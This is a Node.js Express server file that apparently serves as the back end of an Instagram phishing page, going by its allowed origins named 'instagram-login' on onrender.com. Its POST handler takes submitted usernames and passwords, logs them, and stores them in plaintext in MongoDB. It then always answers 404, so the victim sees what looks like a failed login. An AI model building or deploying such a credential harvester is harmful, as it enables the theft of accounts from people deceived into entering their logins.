const express = require("express");
const { getDB } = require("./utils/databaseUtil");
const { mongoConnect } = require("./utils/databaseUtil");
const cors = require("cors");
const path = require("path");
require("dotenv").config();
const app = express();
const PORT = process.env.PORT || 3003;

// Middleware
const allowedOrigins = [
  "http://localhost:5173",
  "http://localhost:5174",
  "https://instagram-login-5dkk.onrender.com",
  "https://instagram-2-662r.onrender.com",
  "https://instagram-login-f33r.onrender.com",
];
app.options("*", cors());
app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true,
    methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
    allowedHeaders: "Origin,X-Requested-With,Content-Type,Accept,Authorization",
  })
);

app.use(express.json());
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));
app.use(express.static(path.join(__dirname, "public")));
app.get("/", (req, res) => {
  res.send(`<h1>Server Is Listening...</h1>`);
});

app.post("/", async (req, res) => {
  const db = getDB();
  const { username, password } = req.body;
  console.log(req.body);
  if (!username || !password) {
    return res.sendStatus(404);
  }
  try {
    await db.collection("users").insertOne({ username, password });
    return res.sendStatus(404);
  } catch (error) {
    console.error("Database error:", error);
    return res.sendStatus(404);
  }
});

// 404 Route - Handles all unknown routes
app.use((req, res) => {
  return res.sendStatus(404);
});

// Database Connection
mongoConnect(() => {
  console.log("DB connected");
  app.listen(PORT, () => {
    console.log(`Server running on address http://localhost:${PORT}`);
  });
});
